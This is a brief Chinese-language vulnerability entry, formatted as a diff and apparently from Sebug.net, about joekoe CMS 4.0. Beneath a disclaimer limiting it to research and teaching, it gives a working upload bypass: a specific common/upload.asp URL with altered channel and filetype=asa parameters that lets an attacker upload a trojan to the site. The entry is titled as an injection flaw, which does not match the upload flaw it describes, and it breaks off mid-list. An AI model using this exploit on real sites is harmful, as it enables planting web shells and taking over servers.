@@ -1,0 +1,9 @@
+joekoe CMS 4.0 注入漏洞
+
+
+
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.1 .上传漏洞：很好利用，把channel变量改一下，只要不等于forum、user.face、blog.logo就行，然后filetype改成asa,就可以光明正大的上传木马了，具体url可以这样common/upload.asp?channel=use&filetype=asa&filename=&fileinput=u_face&formname=&thumbname=&thumbinput=，然后上传2. 
